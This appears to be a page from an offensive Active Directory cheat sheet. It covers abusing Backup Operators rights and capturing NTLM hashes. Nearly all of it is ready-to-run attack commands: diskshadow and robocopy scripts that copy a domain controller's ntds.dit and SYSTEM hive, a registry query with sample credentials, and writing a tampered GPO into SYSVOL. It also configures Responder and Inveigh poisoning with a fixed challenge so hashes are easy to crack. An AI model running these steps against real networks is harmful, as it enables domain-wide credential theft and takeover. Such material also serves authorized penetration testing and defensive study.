<h3 id="bkmrk-backup-operators">Backup Operators</h3>
<p id="bkmrk-can-normally-log-in-">Can <em>normally</em> log in on any machines of the domain.</p>
<h4 id="bkmrk-file-system-backup">File system backup</h4>
<p id="bkmrk-can-backup-the-entir">Can backup the <strong>entire file system</strong> of a machine (DC included) and have full read/write rights on the backup</p>
<p id="bkmrk-to-backup-a-folder-%3A">To backup a folder :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 449px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 448.524px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-to-backup-with-disks">To backup with <strong>Diskshadow + Robocopy</strong>:</p>
<ul id="bkmrk-create-a-script.txt-"><li>Create a <code>script.txt</code> file to backup with Diskshadow</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 206px; min-width: 282.048px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set verbose onX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set metadata C:\Windows\Temp\meta.cabX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set context clientaccessibleX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set context persistentX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">begin backupX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">add volume C: alias cdriveX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">createX</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">expose %cdrive% E:X</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">end backupX</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 206px;"></div><div class="CodeMirror-gutters" style="height: 246px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-backup-with-diskshad"><li>Backup with <code>diskshadow /s script.txt</code>
</li>
<li>Retrieve the backup with <strong>robocopy</strong> and send the NTDS file in the current folder : <code>robocopy /b E:\Windows\ntds . ntds.dit</code>
</li>
<li>Then retrieve the SYSTEM registry hive to decrypt and profit <code>reg save hklm\system c:\temp\system</code>
</li>
</ul><p id="bkmrk-to-backup-with-disks-0">To backup with <strong>Diskshadow + DLLs</strong>:</p>
<ul id="bkmrk-similar-script-for-d"><li>Similar script for Diskshadow</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 485px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 484.714px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set context persistent nowritersx</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set metadata c:\windows\system32\spool\drivers\color\example.cabx</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">add volume c: alias someAliasx</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">createx</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">expose %someAlias% z:x</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.ditx</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">delete shadows volume %someAlias%x</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resetx</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-with-these-dlls"><li>With <a href="https://github.com/giuliano108/SeBackupPrivilege">these</a> DLLs</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 579px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 578.81px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Import-Module</span> <span class="cm-punctuation">.\</span><span class="cm-identifier">SeBackupPrivilegeCmdLets</span><span class="cm-punctuation">.</span><span class="cm-identifier">dll</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Import-Module</span> <span class="cm-punctuation">.\</span><span class="cm-identifier">SeBackupPrivilegeUtils</span><span class="cm-punctuation">.</span><span class="cm-identifier">dll</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Copy-FileSeBackupPrivilege</span> <span class="cm-builtin">z:</span><span class="cm-punctuation">\</span><span class="cm-identifier">windows</span><span class="cm-punctuation">\</span><span class="cm-identifier">ntds</span><span class="cm-punctuation">\</span><span class="cm-identifier">ntds</span><span class="cm-punctuation">.</span><span class="cm-identifier">dit</span> <span class="cm-builtin">C:</span><span class="cm-punctuation">\</span><span class="cm-identifier">temp</span><span class="cm-punctuation">\</span><span class="cm-identifier">ntds</span><span class="cm-punctuation">.</span><span class="cm-identifier">dit</span> <span class="cm-operator">-</span><span class="cm-identifier">Overwrite</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">reg</span> <span class="cm-identifier">save</span> <span class="cm-identifier">HKLM</span><span class="cm-punctuation">\</span><span class="cm-identifier">SYSTEM</span> <span class="cm-builtin">c:</span><span class="cm-punctuation">\</span><span class="cm-identifier">temp</span><span class="cm-punctuation">\</span><span class="cm-identifier">system</span><span class="cm-punctuation">.</span><span class="cm-identifier">hive</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-registry-read-rights">Registry read rights</h4>
<p id="bkmrk-the-backup-operators">The <strong>Backup Operators</strong> can read all the machines registry</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1085px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1085.48px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 reg.py <span class="cm-string">'domain.local'</span>/<span class="cm-string">'user1'</span>:<span class="cm-string">'Password123'</span>@&lt;target&gt;.domain.local query <span class="cm-attribute">-keyName</span> <span class="cm-string">'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-gpos-read%2Fwrite-righ">GPOs read/write rights</h4>
<p id="bkmrk-normally-the-backup-">Normally the <strong>Backup Operators</strong> can read and rights all the domain and DC GPOs with <strong>robocopy</strong> in <strong>backup</strong> mode</p>
<ul id="bkmrk-found-the-interestin"><li>Found the interesting GPO with <code>Get-NetGPO</code> . For example <strong>Default Domain Policy</strong> in the Domain Controller policy</li>
<li>Get the file at the path <code>\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code> and add whatever you want in it</li>
<li>Write the file with <strong>robocopy</strong>:</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1151px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1150.62px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">robocopy</span> <span class="cm-string">"C:\tmp"</span> <span class="cm-string">"\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit"</span> <span class="cm-identifier">GptTmpl</span><span class="cm-punctuation">.</span><span class="cm-identifier">inf</span> <span class="cm-operator">/</span><span class="cm-identifier">ZB</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-ntlm">NTLM</h2>
<h3 id="bkmrk-capture%2C-coerce-and-">Capture, Coerce and Leak NTLM</h3>
<p id="bkmrk-different-ways-to-ob">Different ways to obtain and catch Net-NTLM authentications and retrieve a NTLM response.</p>
<h4 id="bkmrk-responder-%2F-inveigh">Responder / Inveigh</h4>
<p id="bkmrk-change-the-authentic">Change the authentication challenge to <code>1122334455667788</code> in the Responder conf file in order to obtain an easily crackable hash if <strong>NTLMv1</strong> is used.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 463px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 463px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">sed</span> <span class="cm-attribute">-i</span> <span class="cm-string">'s/ Random/ 1122334455667788/g'</span> Responder/Responder.conf</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-catch-all-the-possib">Catch all the possible hashes on the network (coming via LLMNR, NBT-NS, DNS spoofing, etc):</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 745px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 745.286px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Responder with WPAD injection, Proxy-Auth, DHCP, DHCP-DNS and verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">responder <span class="cm-attribute">-I</span> interface_to_use <span class="cm-attribute">-wPdDv</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Inveigh with *</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Invoke-Inveigh <span class="cm-attribute">-Challenge</span> <span class="cm-number">1122334455667788</span> <span class="cm-attribute">-ConsoleOutput</span> Y <span class="cm-attribute">-LLMNR</span> Y <span class="cm-attribute">-NBNS</span> Y <span class="cm-attribute">-mDNS</span> Y <span class="cm-attribute">-HTTPS</span> Y <span class="cm-attribute">-Proxy</span> Y</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
